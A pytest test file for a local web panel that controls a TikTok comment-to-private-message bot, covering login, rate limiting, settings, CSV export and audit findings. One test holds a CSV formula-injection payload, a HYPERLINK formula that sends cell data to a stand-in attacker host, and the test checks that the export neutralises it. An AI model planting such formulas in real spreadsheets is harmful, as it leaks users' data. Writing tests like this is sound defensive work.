from datetime import timedelta

import pytest
from fastapi.testclient import TestClient

from bot import config
from bot.ritmo import iso
from conftest import AHORA, meter_comentario
from panel.app import crear_app

CONTRASENA = "clave-panel"


@pytest.fixture
def cliente(conn, tmp_path):
    datos = config.carpeta_datos()
    (datos / ".env").write_text(f"PANEL_CONTRASENA={CONTRASENA}\n", encoding="utf-8")
    meter_comentario(conn, "c1", "ana", texto="info")
    meter_comentario(conn, "c2", "luis", estado="error_final")
    with conn:
        conn.execute("INSERT INTO textos (tipo, contenido) VALUES ('dm', 'Hola {nombre}, mira {landing}')")
        conn.execute("INSERT INTO acciones (tipo, resultado, hecho_en) VALUES ('dm', 'ok', ?)", (iso(AHORA),))
    c = TestClient(crear_app(), base_url="http://127.0.0.1")
    r = c.post("/entrar", data={"contrasena": CONTRASENA}, follow_redirects=False)
    assert r.status_code == 303
    return c


def test_sin_entrar_redirige_al_login(conn):
    (config.carpeta_datos() / ".env").write_text(f"PANEL_CONTRASENA={CONTRASENA}\n", encoding="utf-8")
    c = TestClient(crear_app(), base_url="http://127.0.0.1")
    r = c.get("/", follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == "/entrar"
    r = c.post("/entrar", data={"contrasena": "mala"}, follow_redirects=False)
    assert r.status_code == 401


def test_sin_contrasena_no_deja_ver_nada_y_pide_crearla(conn):
    c = TestClient(crear_app(), base_url="http://127.0.0.1")
    r = c.get("/", follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == "/entrar"
    assert "Crear contraseña" in c.get("/entrar").text
    assert c.post("/entrar", data={"contrasena": ""}).status_code in (401, 422)


def test_contrasena_con_enie_o_tildes_deja_volver_a_entrar(conn):
    """Auditoría 26 nov: «contraseña» se podía crear, pero al volver a entrar daba error 500 y el cliente se
    quedaba fuera del panel (la comparación no aceptaba ñ ni tildes)."""
    c = TestClient(crear_app(), base_url="http://127.0.0.1")
    r = c.post("/entrar/crear", data={"nueva": "contraseñaÁé", "repetida": "contraseñaÁé"}, follow_redirects=False)
    assert r.status_code == 303
    otro = TestClient(crear_app(), base_url="http://127.0.0.1")  # otro navegador (o la cookie borrada): hay que escribirla
    assert otro.post("/entrar", data={"contrasena": "contrasenaAe"}, follow_redirects=False).status_code == 401
    assert otro.post("/entrar", data={"contrasena": "contraseñaÁé"}, follow_redirects=False).status_code == 303
    assert otro.get("/", follow_redirects=False).status_code == 200


def test_cookie_rara_no_da_error_y_pide_entrar(conn):
    (config.carpeta_datos() / ".env").write_text(f"PANEL_CONTRASENA={CONTRASENA}\n", encoding="utf-8")
    c = TestClient(crear_app(), base_url="http://127.0.0.1")
    r = c.get("/", headers={"Cookie": "panel_bot=ñandú".encode()}, follow_redirects=False)  # bytes, como un navegador
    assert r.status_code == 303 and r.headers["location"] == "/entrar"


@pytest.mark.parametrize("host", ["web-mala.example", "rebind.web-mala.example:8765", "192.168.1.20:8765"])
def test_dns_rebinding_otra_direccion_no_entra(cliente, host):
    """Auditoría 26 nov (hallazgo 10): una web maliciosa que hace que su dominio apunte a 127.0.0.1 llega al panel
    con su propio nombre en «Host». Solo se atiende a 127.0.0.1 / localhost, ni siquiera con la sesión puesta."""
    assert cliente.get("/", headers={"Host": host}).status_code == 400
    assert cliente.post("/entrar", data={"contrasena": CONTRASENA}, headers={"Host": host}).status_code == 400


@pytest.mark.parametrize("host", ["127.0.0.1:8765", "localhost:8765", "[::1]:8765", "127.0.0.1"])
def test_direcciones_locales_si_entran(cliente, host):
    assert cliente.get("/", headers={"Host": host}).status_code == 200


@pytest.mark.parametrize("origen", ["https://web-mala.example", "http://127.0.0.1:8791", "null"])
def test_formulario_enviado_desde_otra_web_se_rechaza(cliente, conn, origen):
    """Otra web (o el panel de prueba de otro puerto, que para el navegador es «el mismo sitio») no puede pulsar
    botones del panel aunque el navegador lleve la sesión: se mira el origen del formulario."""
    r = cliente.post("/apagar", headers={"Origin": origen}, follow_redirects=False)
    assert r.status_code == 403
    r = cliente.post("/apagar", headers={"Referer": origen + "/ajustes"} if origen != "null" else {"Origin": "null"},
                     follow_redirects=False)
    assert r.status_code == 403


def test_formulario_del_propio_panel_si_funciona(cliente):
    r = cliente.post("/entrar", data={"contrasena": CONTRASENA}, headers={"Origin": "http://127.0.0.1"},
                     follow_redirects=False)
    assert r.status_code == 303


def test_otra_web_no_puede_crear_la_contrasena_la_primera_vez(conn):
    """Hallazgo 13: entre la instalación y el momento en que el cliente crea su contraseña, otra web abierta no
    puede adelantarse y crearla ella."""
    c = TestClient(crear_app(), base_url="http://127.0.0.1")
    r = c.post("/entrar/crear", data={"nueva": "atacante1", "repetida": "atacante1"},
               headers={"Origin": "https://web-mala.example"}, follow_redirects=False)
    assert r.status_code == 403
    assert not config.cargar_secretos().get("PANEL_CONTRASENA")


def test_muchas_contrasenas_falsas_seguidas_hacen_esperar(conn, monkeypatch):
    """Hallazgo 10: sin límite se podían probar contraseñas sin parar. Tras 5 fallos seguidos hay que esperar (cada
    vez más); mientras, ni la buena entra. Pasada la espera, la buena entra y el contador vuelve a cero."""
    from panel import app as panel_app

    reloj = [1000.0]
    monkeypatch.setattr(panel_app, "_reloj", lambda: reloj[0])
    (config.carpeta_datos() / ".env").write_text(f"PANEL_CONTRASENA={CONTRASENA}\n", encoding="utf-8")
    c = TestClient(crear_app(), base_url="http://127.0.0.1")
    for _ in range(5):
        assert c.post("/entrar", data={"contrasena": "mala"}).status_code == 401
    r = c.post("/entrar", data={"contrasena": CONTRASENA}, follow_redirects=False)
    assert r.status_code == 429 and "Espera" in r.text
    reloj[0] += 61
    assert c.post("/entrar", data={"contrasena": CONTRASENA}, follow_redirects=False).status_code == 303
    assert c.post("/entrar", data={"contrasena": "mala"}).status_code == 401  # contador a cero: avisa normal


@pytest.mark.parametrize("ruta", ["/", "/textos", "/ajustes", "/correo", "/registro", "/reels", "/registro.csv"])
def test_cada_pagina_responde_200(cliente, ruta):
    assert cliente.get(ruta).status_code == 200


def test_inicio_muestra_estado_cola_y_modo_prueba(cliente):
    html = cliente.get("/").text
    assert "Modo de prueba" in html
    assert "persona esperando su mensaje" in html and ">1<" in html  # 1 comentario en cola


def test_inicio_lleva_a_la_lista_de_quien_espera_su_mensaje(cliente, conn):
    """Pulsar el número (o «Ver quiénes son») abre la lista de quienes aún no han recibido su mensaje.
    Cuenta también a quien espera un reintento: tampoco le ha llegado nada."""
    meter_comentario(conn, "c3", "marta", estado="error")
    html = cliente.get("/").text
    assert 'href="/registro?estado=pendientes"' in html and "Ver quiénes son" in html
    assert ">2<" in html  # ana (en cola) + marta (reintento)


def test_inicio_sin_nadie_esperando_no_ofrece_la_lista(cliente, conn):
    with conn:
        conn.execute("UPDATE comentarios SET estado = 'completado' WHERE estado = 'en_cola'")
    assert "Ver quiénes son" not in cliente.get("/").text


def test_registro_pendientes_solo_quien_aun_no_tiene_su_mensaje(cliente, conn):
    meter_comentario(conn, "c3", "marta", estado="error")
    meter_comentario(conn, "c4", "pepe", estado="completado")
    html = cliente.get("/registro?estado=pendientes").text
    assert "ana" in html and "marta" in html
    assert "luis" not in html and "pepe" not in html
    assert "aún no han recibido su mensaje" in html


def test_pausar_y_reanudar(cliente, conn):
    cliente.post("/pausar")
    assert config.leer(conn, "orden_pausa") is True
    cliente.post("/reanudar")
    assert config.leer(conn, "orden_pausa") is False


def test_reanudar_saca_de_parado_revision(cliente, conn):
    with conn:
        conn.execute("UPDATE estado_bot SET modo = 'parado_revision'")
    cliente.post("/reanudar")
    assert conn.execute("SELECT modo FROM estado_bot").fetchone()[0] == "activo"


def test_textos_crear_editar_desactivar_y_aviso_sin_landing(cliente, conn):
    cliente.post("/textos/nuevo", data={"tipo": "dm", "contenido": "Hola {nombre} sin enlace"})
    fila = conn.execute("SELECT * FROM textos WHERE contenido LIKE '%sin enlace'").fetchone()
    assert fila["activo"] == 1
    html = cliente.get("/textos").text
    assert "no lleva {landing}" in html
    assert "Hola María sin enlace" in html  # vista previa
    cliente.post(f"/textos/{fila['id']}", data={"contenido": "Hola {nombre}, mira {landing}", "activo": "0"})
    fila = conn.execute("SELECT * FROM textos WHERE id = ?", (fila["id"],)).fetchone()
    assert fila["activo"] == 0 and "{landing}" in fila["contenido"]


def test_ajustes_se_guardan_y_validan(cliente, conn):
    r = cliente.post("/ajustes", data={
        "modo_publica": "todos", "landing": "https://academia.com", "caducidad_dias": "5",
        "palabras_ofensivas": "pendejo\nidiota\n", "cuentas_equipo": "@setter1\n", "emails_alerta": "a@b.com",
        "descanso_desde": "01:00", "descanso_hasta": "03:00", "modo_prueba": "1",
    })
    assert r.status_code == 200
    assert config.leer(conn, "modo_publica") == "todos"
    assert config.leer(conn, "caducidad_dias") == 5
    assert config.leer(conn, "palabras_ofensivas") == ["pendejo", "idiota"]
    assert config.leer(conn, "cuentas_equipo") == ["setter1"]
    assert config.leer(conn, "descanso_diario_inicio") == ["01:00", "03:00"]
    assert config.leer(conn, "atender_historico") is False  # casilla desmarcada = no
    r = cliente.post("/ajustes", data={"modo_publica": "a_veces"})
    assert r.status_code == 400
    assert config.leer(conn, "modo_publica") == "todos"


def test_registro_filtra_y_exporta_csv(cliente):
    html = cliente.get("/registro?estado=error_final").text
    assert "luis" in html and "ana" not in html
    csv = cliente.get("/registro.csv").text
    assert csv.startswith("\ufeff")  # BOM: Excel abre bien tildes y emojis
    csv = csv.lstrip("\ufeff")
    assert csv.splitlines()[0].startswith("id,")
    assert "ana" in csv and "luis" in csv


def test_excel_descargado_no_ejecuta_formulas_de_tiktok(cliente, conn):
    """Auditoría 26 nov (hallazgo 12): un comentario o nombre de TikTok que empiece por = + - @ se abría en Excel
    como fórmula (p. ej. un enlace trampa en el Excel con los teléfonos de los leads). Se le pone ' delante.
    Los teléfonos (+1 801…) y los @usuario que pone el propio bot se dejan como están."""
    import csv as csvmod
    import io

    malo = '=HYPERLINK("http://malo.example/?x="&A1,"Pulsa")'
    with conn:
        conn.execute("UPDATE comentarios SET texto = ? WHERE id = 'c1'", (malo,))
        conn.execute("UPDATE contactos SET nombre = '=1+1' WHERE user_id = 'u:ana'")
        conn.execute("INSERT INTO leads (user_id, usuario, nombre, telefono, palabra_clave, creado_en) VALUES "
                     "('u:ana', 'ana', '=1+1', '+18015551234', '-2+3', '2026-11-24T18:00:00+00:00')")

    def filas(ruta):
        return list(csvmod.reader(io.StringIO(cliente.get(ruta).text.lstrip("﻿"))))

    registro = filas("/registro.csv")
    texto = registro[0].index("texto")
    assert any(f[texto] == "'" + malo for f in registro[1:])
    leads_csv = filas("/leads.csv")
    cab, fila = leads_csv[0], leads_csv[1]
    assert fila[cab.index("nombre")] == "'=1+1"
    assert fila[cab.index("palabra_clave")] == "'-2+3"
    assert fila[cab.index("telefono")] == "+18015551234"
    assert fila[cab.index("usuario_tiktok")] == "@ana"


@pytest.mark.parametrize("campo,valor", [("caducidad_dias", "1000000"), ("caducidad_dias", "-3"),
                                          ("recordatorio_cada_dias", "99999"), ("max_respuestas_auto", "100000"),
                                          ("seguimiento_espera_h", "99999999999")])
def test_ajustes_con_numeros_absurdos_no_se_guardan(cliente, conn, campo, valor):
    """Hallazgo 14: un número absurdo se guardaba sin queja y el bot dejaba de atender comentarios (fecha fuera de
    rango en cada vuelta). Ahora se avisa en la propia página y no se guarda nada."""
    antes = config.leer(conn, campo)
    datos = {"modo_publica": "todos", "landing": "https://academia.com", "caducidad_dias": "0",
             "palabras_ofensivas": "", "cuentas_equipo": "", "descanso_desde": "02:00", "descanso_hasta": "04:00",
             campo: valor}
    r = cliente.post("/ajustes", data=datos)
    assert r.status_code == 400 and "entre" in r.text
    assert config.leer(conn, campo) == antes


@pytest.mark.parametrize("clave,valor", [("caducidad_dias", 1_000_000), ("seguimiento_espera_h", 10**11),
                                         ("recordatorio_cada_dias", -1), ("max_respuestas_auto", 10**6)])
def test_config_rechaza_numeros_fuera_de_rango(clave, valor):
    """La misma red de seguridad para config.toml (lo que no pasa por el panel)."""
    with pytest.raises(config.ErrorConfig):
        config.validar(clave, valor)


def test_reels_marcar_fijado_a_mano(cliente, conn):
    cliente.post("/reels/r1/fijado-manual")
    assert conn.execute("SELECT fijado_estado FROM reels WHERE id = 'r1'").fetchone()[0] == "manual"


def test_velocidad_desde_inicio(cliente, conn):
    pagina = cliente.get("/").text
    assert "Velocidad de respuesta" in pagina and "Recomendada" in pagina and "Riesgo alto" in pagina
    r = cliente.post("/velocidad", data={"nivel": "2"}, follow_redirects=False)
    assert "velocidad=ok" in r.headers["location"] and config.leer(conn, "nivel_ritmo") == 2
    r = cliente.post("/velocidad", data={"nivel": "6"}, follow_redirects=False)
    assert "velocidad=riesgo" in r.headers["location"] and config.leer(conn, "nivel_ritmo") == 2
    assert "No se guardó" in cliente.get(r.headers["location"]).text
    cliente.post("/velocidad", data={"nivel": "6", "acepto_riesgo": "1"})
    assert config.leer(conn, "nivel_ritmo") == 6
    assert "Cada ~40 s" in cliente.get("/").text
    # máximo de mensajes al día: 100 recomendado; más pide «Entiendo el riesgo»
    assert config.leer(conn, "tope_dm_dia") == 100
    r = cliente.post("/velocidad", data={"nivel": "3", "tope_dm_dia": "250"}, follow_redirects=False)
    assert "velocidad=riesgo" in r.headers["location"] and config.leer(conn, "tope_dm_dia") == 100
    cliente.post("/velocidad", data={"nivel": "3", "tope_dm_dia": "60"})
    assert config.leer(conn, "tope_dm_dia") == 60 and config.leer(conn, "nivel_ritmo") == 3
    assert "<strong>60 + 100</strong>" in cliente.get("/").text


def test_sin_senal_del_bot_en_10_min_avisa_que_no_responde(cliente, conn):
    from datetime import UTC, datetime
    ahora = datetime.now(UTC)
    with conn:
        conn.execute("UPDATE estado_bot SET modo = 'activo', ultimo_latido = ? WHERE id = 1", (iso(ahora - timedelta(minutes=30)),))
    html = cliente.get("/").text
    assert "El bot no responde" in html and "Trabajando" not in html
    assert "El bot no responde" in cliente.get("/textos").text  # también en la cabecera de las demás páginas
    with conn:
        conn.execute("UPDATE estado_bot SET ultimo_latido = ? WHERE id = 1", (iso(ahora - timedelta(minutes=2)),))
    html = cliente.get("/").text
    assert "El bot no responde" not in html and "Trabajando" in html


def test_tras_reanudar_no_dice_en_pausa_aunque_el_bot_aun_no_haya_dado_la_vuelta(cliente, conn):
    from datetime import UTC, datetime
    with conn:  # el bot apuntó «pausado» y aún no ha leído la orden de reanudar
        conn.execute("UPDATE estado_bot SET modo = 'pausado', ultimo_latido = ? WHERE id = 1", (iso(datetime.now(UTC)),))
    cliente.post("/reanudar")
    html = cliente.get("/").text
    # Hasta que el bot da la vuelta no se sabe si de verdad trabaja (p. ej. puede faltar la cuenta): «Reanudando…»
    assert "En pausa" not in html and "Reanudando" in html and "Trabajando" not in html and 'action="/pausar"' in html


def test_registro_enlaza_la_captura_aunque_la_ruta_sea_de_windows(cliente, conn):
    with conn:
        conn.execute("INSERT INTO eventos (tipo, detalle, captura, creado_en) VALUES ('error', 'c2: x', ?, '2026-01-01')",
                     (r"C:\Users\ana\AppData\Local\BotTikTok\capturas\error-c2.png",))
    html = cliente.get("/registro").text
    assert 'href="/capturas/error-c2.png"' in html


def test_correo_sin_js_solo_envia_la_clave_del_proveedor_elegido(cliente):
    html = cliente.get("/correo").text
    gmail = html.split('id="clave"')[0].rsplit("<input", 1)[1] + html.split('id="clave"')[1].split(">", 1)[0]
    otro = html.split('id="clave-otro"')[0].rsplit("<input", 1)[1] + html.split('id="clave-otro"')[1].split(">", 1)[0]
    assert "disabled" not in gmail and "disabled" in otro  # por defecto, Gmail


def test_inicio_lista_los_primeros_pasos_que_faltan(cliente, conn):
    config.guardar(conn, "modo_publica", "solo_cerrados")
    config.guardar(conn, "landing", "")
    html = cliente.get("/").text
    assert "Antes de que el bot pueda trabajar" in html
    assert "Falta configurar el correo de alertas" in html
    assert "Escribe el enlace de tu página (landing)" in html
    assert "Respuesta alternativa" in html and 'href="/textos#grupo-respuesta_alt"' in html
    assert "Todo en orden" not in html  # no dice «todo en orden» si le falta configuración
    # el contador no cuenta el comentario fijado (opcional): 5 pasos necesarios en solo_cerrados
    assert "de 5 pasos necesarios hechos" in html
    # con todo puesto (salvo el correo, que se prueba en test_correo) solo queda el correo
    config.guardar(conn, "landing", "https://academia.com/clase")
    with conn:
        conn.execute("INSERT INTO textos (tipo, contenido) VALUES ('respuesta_alt', 'Te escribí')")
    html = cliente.get("/").text
    assert "Escribe el enlace de tu página (landing)" not in html and 'href="/textos#grupo-respuesta_alt"' not in html


def test_ajustes_con_error_conserva_lo_escrito(cliente, conn):
    r = cliente.post("/ajustes", data={"modo_publica": "todos", "landing": "https://nueva.com/x", "caducidad_dias": "abc",
                                       "palabras_ofensivas": "feo\nmalo", "cuentas_equipo": "ana", "descanso_desde": "03:00",
                                       "descanso_hasta": "05:00"})
    assert r.status_code == 400 and "No se ha guardado" in r.text
    assert 'value="https://nueva.com/x"' in r.text and "feo\nmalo" in r.text and 'value="abc"' in r.text
    assert 'value="todos" checked' in r.text
    assert config.leer(conn, "landing") != "https://nueva.com/x"  # no se guardó nada



def test_cuenta_sin_conectar_conectar_ya_entre_y_desconectar(cliente, conn, monkeypatch):
    from bot import cuenta, navegador

    llamadas = []
    abierta = {"v": False}
    monkeypatch.setattr(navegador, "ventana_sesion_abierta", lambda: abierta["v"])
    monkeypatch.setattr(cuenta, "conectar", lambda: llamadas.append("conectar") or abierta.update(v=True) or True)
    monkeypatch.setattr(cuenta, "listo", lambda: llamadas.append("listo") or abierta.update(v=False) or True)
    config.guardar(conn, "cuenta", "")

    inicio = cliente.get("/").text
    assert "Conecta tu cuenta de TikTok" in inicio and 'href="/cuenta"' in inicio
    assert "Conectar mi cuenta de TikTok" in cliente.get("/cuenta").text

    r = cliente.post("/cuenta/conectar")
    assert llamadas == ["conectar"] and "Ya entré" in r.text and "código QR" in r.text
    r = cliente.post("/cuenta/listo")
    assert llamadas == ["conectar", "listo"] and "Sesión guardada" in r.text

    config.guardar(conn, "cuenta", "academia")
    with conn:
        conn.execute("UPDATE estado_bot SET modo = 'activo' WHERE id = 1")
    pagina = cliente.get("/cuenta").text
    assert "Conectada" in pagina and "@academia" in pagina and "Desconectar" in pagina


def test_desconectar_aparta_el_perfil_y_deja_la_cuenta_vacia(conn, monkeypatch, tmp_path):
    from datetime import UTC, datetime

    from bot import cuenta, instalador, navegador

    monkeypatch.setattr(instalador, "servicio_instalado", lambda _n: False)
    perfil = navegador.carpeta_perfil()
    perfil.mkdir(parents=True, exist_ok=True)
    (perfil / "Cookies").write_text("x")
    cuenta.desconectar(conn, datetime(2026, 11, 25, 12, 0, tzinfo=UTC))
    assert not perfil.exists() and (perfil.parent / "perfil-desconectado-20261125-120000" / "Cookies").exists()
    assert config.leer(conn, "cuenta") == ""
    assert conn.execute("SELECT modo FROM estado_bot").fetchone()[0] == "sin_cuenta"


def test_soporte_quita_un_freno_falso_con_su_clave(cliente, conn):
    from bot.freno import Freno

    config.guardar_secretos({"SOPORTE_CLAVE": config.resumen_clave("soporte123")})
    Freno(conn).aviso("desconocido", "Ventana desconocida", None, AHORA)
    assert "Quitar el freno" in cliente.get("/").text
    r = cliente.post("/quitar-freno", data={"clave_soporte": "mala"}, follow_redirects=False)
    assert r.status_code == 303 and "clave" in r.headers["location"]
    assert conn.execute("SELECT modo FROM estado_bot").fetchone()[0] == "frenado"
    assert "no es correcta" in cliente.get(r.headers["location"]).text
    cliente.post("/quitar-freno", data={"clave_soporte": "soporte123"})
    assert conn.execute("SELECT modo FROM estado_bot").fetchone()[0] == "activo"


def test_textos_recomienda_3_versiones(cliente):
    assert "3 o más versiones" in cliente.get("/textos").text  # el cliente de prueba tiene 1 sola versión del mensaje


def test_cupo_de_seguidores_desde_inicio(cliente, conn):
    assert "Extra para tus seguidores" in cliente.get("/").text
    r = cliente.post("/velocidad", data={"nivel": "3", "tope_dm_dia": "100", "tope_seguidores": "200"},
                     follow_redirects=False)
    assert "velocidad=riesgo" in r.headers["location"] and config.leer(conn, "tope_dm_seguidores_dia") == 100
    cliente.post("/velocidad", data={"nivel": "3", "tope_dm_dia": "100", "tope_seguidores": "0"})
    assert config.leer(conn, "tope_dm_seguidores_dia") == 0
    assert "<strong>100</strong>" in cliente.get("/").text.split("Máximo al día")[1]


def test_apagar_y_encender_el_bot(cliente, conn, monkeypatch):
    """El cliente apaga el bot del todo (Chrome cerrado, la computadora puede dormir) y sigue apagado al reiniciar."""
    from bot import instalador

    hecho = []
    monkeypatch.setattr(instalador, "servicio_instalado", lambda nombre: True)
    monkeypatch.setattr(instalador, "parar", lambda nombre: hecho.append(("parar", nombre)))
    monkeypatch.setattr(instalador, "arrancar", lambda nombre: hecho.append(("arrancar", nombre)))
    assert "Apagar el bot" in cliente.get("/").text
    cliente.post("/apagar")
    assert config.leer(conn, "apagado") is True
    assert conn.execute("SELECT modo FROM estado_bot").fetchone()[0] == "apagado"
    assert hecho == [("parar", "bot"), ("arrancar", "bot")]  # vuelve sin Chrome, esperando a que lo enciendan
    pagina = cliente.get("/").text
    assert "Apagado" in pagina and "Encender" in pagina and 'action="/pausar"' not in pagina
    hecho.clear()
    cliente.post("/encender")
    assert config.leer(conn, "apagado") is False
    assert hecho == [("parar", "bot"), ("arrancar", "bot")]
    assert "Apagar el bot" in cliente.get("/").text


def test_apagado_sin_latido_no_dice_que_no_responde(cliente, conn):
    config.guardar(conn, "apagado", True)
    with conn:
        conn.execute("UPDATE estado_bot SET modo = 'apagado', ultimo_latido = ?", (iso(AHORA - timedelta(hours=5)),))
    pagina = cliente.get("/").text
    assert "Apagado" in pagina and "no responde" not in pagina


def test_textos_solo_avisa_en_rojo_de_lo_que_hace_falta(cliente, conn):
    config.guardar(conn, "modo_publica", "solo_cerrados")
    with conn:
        conn.execute("DELETE FROM textos")
    html = cliente.get("/textos").text
    # vacíos: mensaje privado y mensajes cerrados (necesarios) en rojo; respuesta pública no hace falta; fijado opcional
    assert html.count("el bot no podrá usar este tipo de texto") == 2
    assert "No hace falta con la forma de responder elegida" in html
    assert "Opcional. Escríbelo aquí" in html
    config.guardar(conn, "modo_publica", "todos")
    assert cliente.get("/textos").text.count("el bot no podrá usar este tipo de texto") == 3


def test_ya_entre_sin_sesion_explica_que_hacer(cliente, conn, monkeypatch):
    from datetime import timedelta

    from bot import cuenta, navegador
    from bot.ritmo import iso
    from panel import app as panel_app

    monkeypatch.setattr(navegador, "ventana_sesion_abierta", lambda: False)
    monkeypatch.setattr(cuenta, "listo", lambda: True)
    config.guardar(conn, "cuenta", "")
    with conn:
        conn.execute("UPDATE estado_bot SET modo = 'sin_cuenta' WHERE id = 1")
    cliente.post("/cuenta/listo")
    ahora = panel_app.ahora()
    with conn:  # el bot aún no ha vuelto a mirar: no se avisa todavía
        conn.execute("UPDATE estado_bot SET ultimo_latido = ? WHERE id = 1", (iso(ahora),))
    assert "No vimos tu cuenta" not in cliente.get("/cuenta").text
    with conn:  # el bot arrancó, miró y sigue sin cuenta
        conn.execute("UPDATE estado_bot SET ultimo_latido = ? WHERE id = 1", (iso(ahora + timedelta(seconds=60)),))
    assert "No vimos tu cuenta" in cliente.get("/cuenta").text


def test_ajustes_al_quitar_el_modo_de_prueba_repone_la_cola(cliente, conn):
    config.guardar(conn, "modo_prueba", True)
    datos = {"modo_publica": "solo_cerrados", "landing": "https://academia.com", "caducidad_dias": "0",
             "palabras_ofensivas": "", "cuentas_equipo": "", "descanso_desde": "03:00", "descanso_hasta": "05:00"}
    r = cliente.post("/ajustes", data={**datos, "modo_prueba": "1"})
    assert "Modo de prueba quitado" not in r.text  # guardar sin cambiarlo no dice nada
    r = cliente.post("/ajustes", data=datos)  # casilla sin marcar = modo real
    assert r.status_code == 200 and "Modo de prueba quitado" in r.text
    assert config.leer(conn, "modo_prueba") is False


# ---------------------------------------------------------------- auditoría 26 nov, hallazgo 19


def test_la_contrasena_del_panel_no_queda_legible_en_el_archivo_de_claves(conn):
    """Antes se guardaba tal cual en .env. Una instalación anterior (contraseña en claro) se convierte sola al
    arrancar el panel y la misma contraseña sigue sirviendo."""
    env = config.carpeta_datos() / ".env"
    env.write_text(f"PANEL_CONTRASENA={CONTRASENA}\n", encoding="utf-8")
    c = TestClient(crear_app(), base_url="http://127.0.0.1")
    assert CONTRASENA not in env.read_text(encoding="utf-8")
    assert config.es_resumen(config.cargar_secretos().get("PANEL_CONTRASENA"))
    assert c.post("/entrar", data={"contrasena": CONTRASENA}, follow_redirects=False).status_code == 303
    assert c.get("/", follow_redirects=False).status_code == 200
    # Con el panel ya en marcha, alguien la escribe a mano en el .env (p. ej. soporte, para dar una nueva): vale y
    # se convierte en cuanto se usa.
    config.guardar_secretos({"PANEL_CONTRASENA": "otra-clave-9"})
    otro = TestClient(crear_app(), base_url="http://127.0.0.1")
    assert otro.post("/entrar", data={"contrasena": "otra-clave-9"}, follow_redirects=False).status_code == 303
    assert "otra-clave-9" not in env.read_text(encoding="utf-8")


def test_la_sesion_caduca_a_los_30_dias(conn, monkeypatch):
    import panel.app as panel_app

    (config.carpeta_datos() / ".env").write_text(f"PANEL_CONTRASENA={CONTRASENA}\n", encoding="utf-8")
    monkeypatch.setattr(panel_app, "ahora", lambda: AHORA)
    c = TestClient(crear_app(), base_url="http://127.0.0.1")
    c.post("/entrar", data={"contrasena": CONTRASENA})
    monkeypatch.setattr(panel_app, "ahora", lambda: AHORA + timedelta(days=29))
    assert c.get("/", follow_redirects=False).status_code == 200
    monkeypatch.setattr(panel_app, "ahora", lambda: AHORA + timedelta(days=30, minutes=1))
    r = c.get("/", follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == "/entrar"


def test_la_cookie_no_se_puede_alargar_ni_copiar_de_la_version_anterior(cliente):
    import hashlib
    import hmac

    valor = cliente.cookies.get("panel_bot")
    expira, _, firma = valor.partition(".")
    cliente.cookies.set("panel_bot", f"{int(expira) + 365 * 86400}.{firma}")  # «caduca dentro de un año»
    assert cliente.get("/", follow_redirects=False).status_code == 303
    # La cookie de antes (siempre la misma, sacada de la contraseña) ya no vale.
    vieja = hmac.new(CONTRASENA.encode(), b"panel-bot-tiktok", hashlib.sha256).hexdigest()
    cliente.cookies.set("panel_bot", vieja)
    assert cliente.get("/", follow_redirects=False).status_code == 303


def test_salir_cierra_la_sesion_en_todos_los_navegadores(cliente):
    otro = TestClient(crear_app(), base_url="http://127.0.0.1")  # p. ej. el panel abierto en otro navegador
    otro.post("/entrar", data={"contrasena": CONTRASENA})
    assert otro.get("/", follow_redirects=False).status_code == 200
    assert 'action="/salir"' in cliente.get("/ajustes").text
    r = cliente.post("/salir", follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == "/entrar"
    assert cliente.get("/", follow_redirects=False).status_code == 303
    assert otro.get("/", follow_redirects=False).status_code == 303
    # La contraseña sigue siendo la misma.
    assert cliente.post("/entrar", data={"contrasena": CONTRASENA}, follow_redirects=False).status_code == 303
    assert cliente.get("/", follow_redirects=False).status_code == 200


def test_salir_desde_otra_web_no_hace_nada(cliente):
    r = cliente.post("/salir", headers={"origin": "http://otra-web.com"}, follow_redirects=False)
    assert r.status_code == 403
    assert cliente.get("/", follow_redirects=False).status_code == 200


def test_inicio_avisa_si_los_privados_estan_en_pausa(cliente, conn):
    from datetime import UTC, datetime
    assert "Mensajes privados en pausa" not in cliente.get("/").text
    with conn:
        for i in range(3):
            conn.execute("INSERT INTO acciones (tipo, comentario_id, resultado, hecho_en) VALUES ('dm', ?, 'dudoso', ?)",
                         (f"x{i}", iso(datetime.now(UTC))))
    assert "Mensajes privados en pausa hasta" in cliente.get("/").text


def test_inicio_avisa_si_no_salen_los_correos_de_aviso_hasta_que_vuelven_a_salir(cliente, conn):
    from datetime import UTC, datetime
    ahora_real = datetime.now(UTC)
    assert "No te están llegando los correos" not in cliente.get("/").text
    with conn:
        conn.execute("INSERT INTO eventos (tipo, detalle, creado_en) VALUES ('alerta_fallida', ?, ?)",
                     ("email no enviado (🟡 Bot de TikTok · Pausa: vuelve solo): El correo o la contraseña no son correctos.",
                      iso(ahora_real - timedelta(minutes=5))))
    texto = cliente.get("/").text
    assert "No te están llegando los correos" in texto and "El correo o la contraseña no son correctos." in texto
    with conn:  # vuelve a salir un aviso: el panel deja de avisar
        conn.execute("INSERT INTO eventos (tipo, detalle, creado_en) VALUES ('alerta_email', 'x', ?)", (iso(ahora_real),))
    assert "No te están llegando los correos" not in cliente.get("/").text


def _no_le_llego(conn, cid="c9", usuario="linda"):
    meter_comentario(conn, cid, usuario, estado="completado_cerrado")
    with conn:
        conn.execute("UPDATE contactos SET contactado = 1, resultado = 'dm_no_entregado' WHERE usuario = ?", (usuario,))


def test_registro_ofrece_enviar_el_privado_a_mano_a_quien_no_le_llego(cliente, conn):
    _no_le_llego(conn)
    with conn:  # a quien sí le llegó, no
        conn.execute("UPDATE contactos SET contactado = 1, resultado = 'dm_enviado' WHERE usuario = 'luis'")
        conn.execute("UPDATE comentarios SET estado = 'completado' WHERE id = 'c2'")
    texto = cliente.get("/registro").text
    assert texto.count("Enviar mensaje privado ahora") == 1
    assert 'action="/registro/privado/u:linda"' in texto


def test_pulsar_el_boton_pide_el_mensaje_una_sola_vez_y_el_registro_dice_como_va(cliente, conn):
    _no_le_llego(conn)
    r = cliente.post("/registro/privado/u:linda", follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == "/registro?pedido=linda"
    cliente.post("/registro/privado/u:linda", follow_redirects=False)  # doble clic: un solo mensaje
    assert conn.execute("SELECT COUNT(*) FROM envios WHERE tipo = 'dm_manual' AND user_id = 'u:linda'").fetchone()[0] == 1
    texto = cliente.get("/registro?pedido=linda").text
    assert "Mensaje privado a @linda en camino" in texto and "Enviando el mensaje privado…" in texto
    assert 'action="/registro/privado/u:linda"' not in texto and "location.reload" in texto  # en camino: sin botón
